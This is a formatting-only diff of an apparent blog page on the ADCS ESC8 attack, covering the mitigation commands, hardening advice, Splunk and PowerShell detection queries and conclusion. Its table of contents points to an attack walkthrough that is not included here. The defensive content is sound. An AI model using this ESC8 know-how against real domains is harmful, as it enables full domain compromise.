 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="defense-and-mitigation">Defense and Mitigation<a href="#defense-and-mitigation" class="hash-link" aria-label="Direct link to Defense and Mitigation" title="Direct link to Defense and Mitigation" translate="no">​</a></h2>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="immediate-mitigation">Immediate Mitigation<a href="#immediate-mitigation" class="hash-link" aria-label="Direct link to Immediate Mitigation" title="Direct link to Immediate Mitigation" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-disable-http-web-enrollment">1. Disable HTTP Web Enrollment<a href="#1-disable-http-web-enrollment" class="hash-link" aria-label="Direct link to 1. Disable HTTP Web Enrollment" title="Direct link to 1. Disable HTTP Web Enrollment" translate="no">​</a></h3>
 <p><strong>PowerShell Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Disable HTTP Web Enrollment</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Set</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">WebConfigurationProperty </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Filter</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> &quot;system.webServer/security/authentication/windowsAuthentication&quot; `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">PSPath &quot;IIS:\Sites\Default Web Site\CertSrv&quot; `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Name &quot;enabled&quot; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Value</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> $</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">false</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Disable HTTP Web Enrollment</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Set-WebConfigurationProperty -Filter &quot;system.webServer/security/authentication/windowsAuthentication&quot; `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -PSPath &quot;IIS:\Sites\Default Web Site\CertSrv&quot; `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -Name &quot;enabled&quot; -Value $false</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Or remove Web Enrollment entirely</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Uninstall-WindowsFeature ADCS-Web-Enrollment</span><br></div></code></pre></div></div>
-<p>**Impact:**Prevents ESC8 attacks but may break certificate enrollment workflows.</p>
+<p><strong>Impact:</strong> Prevents ESC8 attacks but may break certificate enrollment workflows.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-enable-https-for-web-enrollment">2. Enable HTTPS for Web Enrollment<a href="#2-enable-https-for-web-enrollment" class="hash-link" aria-label="Direct link to 2. Enable HTTPS for Web Enrollment" title="Direct link to 2. Enable HTTPS for Web Enrollment" translate="no">​</a></h3>
 <p><strong>Steps:</strong></p>
 <ul>
@@ -946,7 +946,7 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </li>
 </ul>
 <p><strong>PowerShell:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Configure HTTPS binding</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">New-WebBinding -Name </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Default Web Site&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -Protocol https -Port 443 -IPAddress </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;*&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Configure HTTPS binding</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">New-WebBinding -Name &quot;Default Web Site&quot; -Protocol https -Port 443 -IPAddress &quot;*&quot;</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-secure-certificate-templates">3. Secure Certificate Templates<a href="#3-secure-certificate-templates" class="hash-link" aria-label="Direct link to 3. Secure Certificate Templates" title="Direct link to 3. Secure Certificate Templates" translate="no">​</a></h3>
 <p><strong>Review and Secure:</strong></p>
 <ul>
@@ -964,54 +964,54 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </li>
 </ul>
 <p><strong>PowerShell:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Example: Secure a template</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$template</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> = Get-CertificateTemplate -Name </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;ESC1&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Set-CertificateTemplate -Template </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$template</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -ClientAuthentication </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$false</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -RequireManagerApproval </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$true</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Example: Secure a template</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$template = Get-CertificateTemplate -Name &quot;ESC1&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Set-CertificateTemplate -Template $template `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -ClientAuthentication $false `</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -RequireManagerApproval $true</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="long-term-security-measures">Long-Term Security Measures<a href="#long-term-security-measures" class="hash-link" aria-label="Direct link to Long-Term Security Measures" title="Direct link to Long-Term Security Measures" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-network-segmentation">1. Network Segmentation<a href="#1-network-segmentation" class="hash-link" aria-label="Direct link to 1. Network Segmentation" title="Direct link to 1. Network Segmentation" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>Isolate ADCS servers</strong>— Place in separate network segment</p>
+<p><strong>Isolate ADCS servers</strong> — Place in separate network segment</p>
 </li>
 <li class="">
-<p><strong>Firewall rules</strong>— Only allow HTTPS (443) from authorized networks</p>
+<p><strong>Firewall rules</strong> — Only allow HTTPS (443) from authorized networks</p>
 </li>
 <li class="">
-<p><strong>VPN requirement</strong>— Require VPN for certificate enrollment</p>
+<p><strong>VPN requirement</strong> — Require VPN for certificate enrollment</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-monitoring-and-alerting">2. Monitoring and Alerting<a href="#2-monitoring-and-alerting" class="hash-link" aria-label="Direct link to 2. Monitoring and Alerting" title="Direct link to 2. Monitoring and Alerting" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>Monitor certificate requests</strong>— Alert on unusual patterns</p>
+<p><strong>Monitor certificate requests</strong> — Alert on unusual patterns</p>
 </li>
 <li class="">
-<p><strong>Track NTLM authentication</strong>— Detect relay attempts</p>
+<p><strong>Track NTLM authentication</strong> — Detect relay attempts</p>
 </li>
 <li class="">
-<p><strong>Certificate usage monitoring</strong>— Alert on certificate-based authentication</p>
+<p><strong>Certificate usage monitoring</strong> — Alert on certificate-based authentication</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-access-controls">3. Access Controls<a href="#3-access-controls" class="hash-link" aria-label="Direct link to 3. Access Controls" title="Direct link to 3. Access Controls" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>Principle of Least Privilege</strong>— Limit who can enroll certificates</p>
+<p><strong>Principle of Least Privilege</strong> — Limit who can enroll certificates</p>
 </li>
 <li class="">
-<p><strong>Template permissions</strong>— Review and restrict enrollment rights</p>
+<p><strong>Template permissions</strong> — Review and restrict enrollment rights</p>
 </li>
 <li class="">
-<p><strong>Audit logging</strong>— Enable comprehensive ADCS auditing</p>
+<p><strong>Audit logging</strong> — Enable comprehensive ADCS auditing</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-regular-security-assessments">4. Regular Security Assessments<a href="#4-regular-security-assessments" class="hash-link" aria-label="Direct link to 4. Regular Security Assessments" title="Direct link to 4. Regular Security Assessments" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>Certificate template reviews</strong>— Quarterly audits</p>
+<p><strong>Certificate template reviews</strong> — Quarterly audits</p>
 </li>
 <li class="">
-<p><strong>ADCS configuration checks</strong>— Verify HTTPS is enabled</p>
+<p><strong>ADCS configuration checks</strong> — Verify HTTPS is enabled</p>
 </li>
 <li class="">
-<p><strong>Penetration testing</strong>— Include ADCS in security assessments</p>
+<p><strong>Penetration testing</strong> — Include ADCS in security assessments</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="detection-and-monitoring">Detection and Monitoring<a href="#detection-and-monitoring" class="hash-link" aria-label="Direct link to Detection and Monitoring" title="Direct link to Detection and Monitoring" translate="no">​</a></h2>
@@ -1109,100 +1109,100 @@ The account is<strong>disabled / locked / revoked</strong>, so KDC refuses it.</
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="detection-queries">Detection Queries<a href="#detection-queries" class="hash-link" aria-label="Direct link to Detection Queries" title="Direct link to Detection Queries" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="splunk-query-example">Splunk Query Example<a href="#splunk-query-example" class="hash-link" aria-label="Direct link to Splunk Query Example" title="Direct link to Splunk Query Example" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">index=windows EventCode=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4886</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> OR EventCode=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4887</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| stats count </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">by</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> UserName, Subject, Template</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">where</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> count &gt; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">5</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> OR UserName=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;*DC*&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> OR UserName=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;*Admin*&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">index=windows EventCode=4886 OR EventCode=4887</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| stats count by UserName, Subject, Template</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">| where count &gt; 5 OR UserName=&quot;*DC*&quot; OR UserName=&quot;*Admin*&quot;</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="powershell-detection-script">PowerShell Detection Script<a href="#powershell-detection-script" class="hash-link" aria-label="Direct link to PowerShell Detection Script" title="Direct link to PowerShell Detection Script" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Monitor certificate requests</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Get-WinEvent -FilterHashtable @{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    LogName=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;Security&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ID=4886,4887</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">} | Where-Object {</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$_</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.Message -match </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;Administrator|Domain Controller&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">} | Select-Object TimeCreated, Message</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># Monitor certificate requests</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Get-WinEvent -FilterHashtable @{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    LogName=&#x27;Security&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ID=4886,4887</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">} | Where-Object {</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    $_.Message -match &quot;Administrator|Domain Controller&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">} | Select-Object TimeCreated, Message</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion">Conclusion<a href="#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" translate="no">​</a></h2>
 <p>The ADCS ESC8 attack represents one of the most sophisticated and dangerous Active Directory attack vectors. It demonstrates how a seemingly minor misconfiguration (HTTP Web Enrollment) can lead to complete domain compromise through a multi-stage attack chain involving NTLM relay, certificate abuse, and Kerberos authentication.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p><strong>ADCS Security is Critical</strong>— Misconfigured ADCS can lead to domain compromise</p>
+<p><strong>ADCS Security is Critical</strong> — Misconfigured ADCS can lead to domain compromise</p>
 </li>
 <li class="">
-<p><strong>HTTPS is Essential</strong>— Never enable Web Enrollment over HTTP</p>
+<p><strong>HTTPS is Essential</strong> — Never enable Web Enrollment over HTTP</p>
 </li>
 <li class="">
-<p><strong>Certificate Templates Matter</strong>— Review and secure all certificate templates</p>
+<p><strong>Certificate Templates Matter</strong> — Review and secure all certificate templates</p>
 </li>
 <li class="">
-<p><strong>Monitoring is Key</strong>— Implement comprehensive logging and alerting</p>
+<p><strong>Monitoring is Key</strong> — Implement comprehensive logging and alerting</p>
 </li>
 <li class="">
-<p><strong>Regular Assessments</strong>— Include ADCS in security audits and penetration tests</p>
+<p><strong>Regular Assessments</strong> — Include ADCS in security audits and penetration tests</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="attack-complexity-rating">Attack Complexity Rating<a href="#attack-complexity-rating" class="hash-link" aria-label="Direct link to Attack Complexity Rating" title="Direct link to Attack Complexity Rating" translate="no">​</a></h2>
-<p><strong>Overall Complexity:</strong>⭐⭐⭐⭐⭐ (5/5)</p>
+<p><strong>Overall Complexity:</strong> ⭐⭐⭐⭐⭐ (5/5)</p>
 <ul>
 <li class="">
-<p>**Technical Knowledge Required:**Very High</p>
+<p><strong>Technical Knowledge Required:</strong> Very High</p>
 </li>
 <li class="">
-<p>**Attack Steps:**4–5 distinct phases</p>
+<p><strong>Attack Steps:</strong> 4–5 distinct phases</p>
 </li>
 <li class="">
-<p>**Tools Required:**Multiple specialized tools</p>
+<p><strong>Tools Required:</strong> Multiple specialized tools</p>
 </li>
 <li class="">
-<p>**Detection Difficulty:**Medium-High</p>
+<p><strong>Detection Difficulty:</strong> Medium-High</p>
 </li>
 <li class="">
-<p>**Real-World Impact:**Critical</p>
+<p><strong>Real-World Impact:</strong> Critical</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-this-attack-matters">Why This Attack Matters<a href="#why-this-attack-matters" class="hash-link" aria-label="Direct link to Why This Attack Matters" title="Direct link to Why This Attack Matters" translate="no">​</a></h2>
-<p>ESC8 is not just a theoretical vulnerability — it’s a<strong>real-world attack vector</strong>that:</p>
+<p>ESC8 is not just a theoretical vulnerability — it’s a <strong>real-world attack vector</strong> that:</p>
 <ul>
 <li class="">
-<p><strong>Affects many organizations</strong>— ADCS is commonly deployed</p>
+<p><strong>Affects many organizations</strong> — ADCS is commonly deployed</p>
 </li>
 <li class="">
-<p><strong>Is often misconfigured</strong>— HTTP Web Enrollment is frequently enabled</p>
+<p><strong>Is often misconfigured</strong> — HTTP Web Enrollment is frequently enabled</p>
 </li>
 <li class="">
-<p><strong>Leads to complete compromise</strong>— Can result in full domain control</p>
+<p><strong>Leads to complete compromise</strong> — Can result in full domain control</p>
 </li>
 <li class="">
-<p><strong>Is hard to detect</strong>— Uses legitimate-looking certificate requests</p>
+<p><strong>Is hard to detect</strong> — Uses legitimate-looking certificate requests</p>
 </li>
 <li class="">
-<p><strong>Is difficult to remediate</strong>— Requires ADCS reconfiguration</p>
+<p><strong>Is difficult to remediate</strong> — Requires ADCS reconfiguration</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="final-recommendations">Final Recommendations<a href="#final-recommendations" class="hash-link" aria-label="Direct link to Final Recommendations" title="Direct link to Final Recommendations" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p><strong>Immediately audit your ADCS deployment</strong>— Check for HTTP Web Enrollment</p>
+<p><strong>Immediately audit your ADCS deployment</strong> — Check for HTTP Web Enrollment</p>
 </li>
 <li class="">
-<p><strong>Enable HTTPS</strong>— Require encrypted connections for all ADCS services</p>
+<p><strong>Enable HTTPS</strong> — Require encrypted connections for all ADCS services</p>
 </li>
 <li class="">
-<p><strong>Review certificate templates</strong>— Ensure proper permissions and configurations</p>
+<p><strong>Review certificate templates</strong> — Ensure proper permissions and configurations</p>
 </li>
 <li class="">
-<p><strong>Implement monitoring</strong>— Set up alerts for suspicious certificate activity</p>
+<p><strong>Implement monitoring</strong> — Set up alerts for suspicious certificate activity</p>
 </li>
 <li class="">
-<p><strong>Regular testing</strong>— Include ADCS in your penetration testing scope</p>
+<p><strong>Regular testing</strong> — Include ADCS in your penetration testing scope</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="references-and-resources">References and Resources<a href="#references-and-resources" class="hash-link" aria-label="Direct link to References and Resources" title="Direct link to References and Resources" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>SpecterOps Research</strong>— “Certified Pre-Owned” (2021)</p>
+<p><strong>SpecterOps Research</strong> — “Certified Pre-Owned” (2021)</p>
 </li>
 <li class="">
 <p><a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noopener noreferrer" class="">https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf</a></p>
 </li>
 </ul>
-<p><strong>2. Certipy Tool</strong>—<a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer" class="">https://github.com/ly4k/Certipy</a></p>
+<p><strong>2. Certipy Tool</strong> — <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener noreferrer" class="">https://github.com/ly4k/Certipy</a></p>
 <p><strong>3. Microsoft ADCS Documentation</strong></p>
 <ul>
 <li class=""><a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-cs/" target="_blank" rel="noopener noreferrer" class="">https://docs.microsoft.com/en-us/windows-server/identity/ad-cs/</a></li>
 </ul>
-<p><strong>4. GOAD Lab</strong>— Game of Active Directory</p>
+<p><strong>4. GOAD Lab</strong> — Game of Active Directory</p>
 <ul>
 <li class=""><a href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank" rel="noopener noreferrer" class="">https://github.com/Orange-Cyberdefense/GOAD</a></li>
 </ul></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/medium-blog-navigation/docs/articles/2026/2026-01-27-ai-driven-black-box-active-directory-penetration-testing-8de0b9ad38b7"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">AI-Driven Black Box Active Directory Penetration Testing</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/medium-blog-navigation/docs/articles/2026/2026-01-29-building-a-vulnerable-gcp-pentest-lab-with-terraform-9d1edfcd8eff"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Building a Vulnerable GCP Pentest Lab with Terraform</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ecosystem-fit" class="table-of-contents__link toc-highlight">Ecosystem Fit</a></li><li><a href="#abstract" class="table-of-contents__link toc-highlight">Abstract</a></li><li><a href="#table-of-contents" class="table-of-contents__link toc-highlight">Table of Contents</a></li><li><a href="#introduction-to-adcs-and-esc8" class="table-of-contents__link toc-highlight">Introduction to ADCS and ESC8</a><ul><li><a href="#what-is-active-directory-certificate-services-adcs" class="table-of-contents__link toc-highlight">What is Active Directory Certificate Services (ADCS)?</a></li><li><a href="#what-is-esc8" class="table-of-contents__link toc-highlight">What is ESC8?</a></li></ul></li><li><a href="#understanding-the-vulnerability" class="table-of-contents__link toc-highlight">Understanding the Vulnerability</a><ul><li><a href="#the-root-cause" class="table-of-contents__link toc-highlight">The Root Cause</a></li></ul></li><li><a href="#attack-flow-diagram" class="table-of-contents__link toc-highlight">Attack Flow Diagram</a></li><li><a href="#why-esc8-is-so-sophisticated" class="table-of-contents__link toc-highlight">Why ESC8 is So Sophisticated</a><ul><li><a href="#1-multi-stage-attack-chain" class="table-of-contents__link toc-highlight">1. Multi-Stage Attack Chain</a></li><li><a href="#2-requires-deep-technical-knowledge" class="table-of-contents__link toc-highlight">2. Requires Deep Technical Knowledge</a></li><li><a href="#3-bypasses-traditional-defenses" class="table-of-contents__link toc-highlight">3. Bypasses Traditional Defenses</a></li><li><a href="#4-stealthy-and-hard-to-detect" class="table-of-contents__link toc-highlight">4. Stealthy and Hard to Detect</a></li><li><a href="#5-real-world-impact" class="table-of-contents__link toc-highlight">5. Real-World Impact</a></li></ul></li><li><a href="#when-this-attack-is-useful" class="table-of-contents__link toc-highlight">When This Attack is Useful</a><ul><li><a href="#scenario-1-initial-access-with-low-privileges" class="table-of-contents__link toc-highlight">Scenario 1: Initial Access with Low Privileges</a></li><li><a href="#scenario-2-network-access-but-no-valid-credentials" class="table-of-contents__link toc-highlight">Scenario 2: Network Access but No Valid Credentials</a></li><li><a href="#scenario-3-bypassing-account-security-controls" class="table-of-contents__link toc-highlight">Scenario 3: Bypassing Account Security Controls</a></li><li><a href="#scenario-4-lateral-movement-across-trusts" class="table-of-contents__link toc-highlight">Scenario 4: Lateral Movement Across Trusts</a></li><li><a href="#scenario-5-red-team-exercises" class="table-of-contents__link toc-highlight">Scenario 5: Red Team Exercises</a></li></ul></li><li><a href="#prerequisites-and-lab-setup" class="table-of-contents__link toc-highlight">Prerequisites and Lab Setup</a><ul><li><a href="#lab-environment" class="table-of-contents__link toc-highlight">Lab Environment</a></li></ul></li><li><a href="#required-tools" class="table-of-contents__link toc-highlight">Required Tools</a></li><li><a href="#initial-access-requirements" class="table-of-contents__link toc-highlight">Initial Access Requirements</a></li><li><a href="#step-by-step-attack-guide" class="table-of-contents__link toc-highlight">Step-by-Step Attack Guide</a></li><li><a href="#phase-0-obtaining-low-privilege-credentials" class="table-of-contents__link toc-highlight">Phase 0: Obtaining Low-Privilege Credentials</a><ul><li><a href="#starting-from-ip-address" class="table-of-contents__link toc-highlight">(Starting from IP Address)</a></li><li><a href="#overview-the-credential-discovery-process" class="table-of-contents__link toc-highlight">Overview: The Credential Discovery Process</a></li><li><a href="#step-01-initial-reconnaissance--port-scanning" class="table-of-contents__link toc-highlight">Step 0.1: Initial Reconnaissance — Port Scanning</a></li><li><a href="#step-02-discover-domain-name" class="table-of-contents__link toc-highlight">Step 0.2: Discover Domain Name</a></li><li><a href="#step-03-enumerate-domain-users-without-credentials" class="table-of-contents__link toc-highlight">Step 0.3: Enumerate Domain Users (Without Credentials)</a></li><li><a href="#user-enumeration-techniques" class="table-of-contents__link toc-highlight">User Enumeration Techniques</a></li><li><a href="#technique-1-kerberos-user-enumeration-kerbrute" class="table-of-contents__link toc-highlight">Technique 1: Kerberos User Enumeration (Kerbrute)</a></li><li><a href="#technique-2-smb-user-enumeration" class="table-of-contents__link toc-highlight">Technique 2: SMB User Enumeration</a></li><li><a href="#technique-3-ldap-user-enumeration-anonymous" class="table-of-contents__link toc-highlight">Technique 3: LDAP User Enumeration (Anonymous)</a></li><li><a href="#technique-4-as-rep-roasting-for-user-discovery" class="table-of-contents__link toc-highlight">Technique 4: AS-REP Roasting for User Discovery</a></li><li><a href="#what-the-messages-mean" class="table-of-contents__link toc-highlight">What the messages mean</a></li><li><a href="#next-practical-steps" class="table-of-contents__link toc-highlight">Next practical steps</a></li><li><a href="#1-save-only-the-hashes-to-a-file-clean-output" class="table-of-contents__link toc-highlight">1) Save only the hashes to a file (clean output)</a></li><li><a href="#2-crack-with-hashcat-as-rep-roast" class="table-of-contents__link toc-highlight">2) Crack with hashcat (AS-REP roast)</a></li><li><a href="#cracked-testuserpassword123" class="table-of-contents__link toc-highlight">Cracked: TestUser@Password123!</a></li><li><a href="#step-05-verify-credentials" class="table-of-contents__link toc-highlight">Step 0.5: Verify Credentials</a></li></ul></li><li><a href="#step-06-enumerate-user-privileges-optional" class="table-of-contents__link toc-highlight">Step 0.6: Enumerate User Privileges (Optional)</a></li><li><a href="#summary-credential-discovery-workflow" class="table-of-contents__link toc-highlight">Summary: Credential Discovery Workflow</a></li><li><a href="#phase-1-reconnaissance-and-enumeration" class="table-of-contents__link toc-highlight">Phase 1: Reconnaissance and Enumeration</a><ul><li><a href="#step-11-discover-adcs-infrastructure" class="table-of-contents__link toc-highlight">Step 